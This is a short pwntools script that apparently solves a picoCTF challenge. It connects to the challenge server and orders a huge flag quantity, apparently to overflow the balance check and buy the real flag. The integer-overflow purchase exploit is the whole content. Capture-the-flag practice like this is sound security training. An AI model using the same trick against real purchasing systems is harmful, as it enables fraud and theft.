#!/usr/bin/env python3
from pwn import *
# exe = ELF('', checksec = False)

# p = process(exe.path)
p = remote('jupiter.challenges.picoctf.org', 9745)

num_flag = 4772000

p.sendlineafter(b'selection\n', b'2')
p.sendlineafter(b'Flag\n', b'1')
p.sendlineafter(b'quantity\n', str(num_flag).encode())

p.sendlineafter(b'selection\n', b'2')
p.sendlineafter(b'Flag\n', b'2')
p.sendlineafter(b'one', b'1')

p.interactive()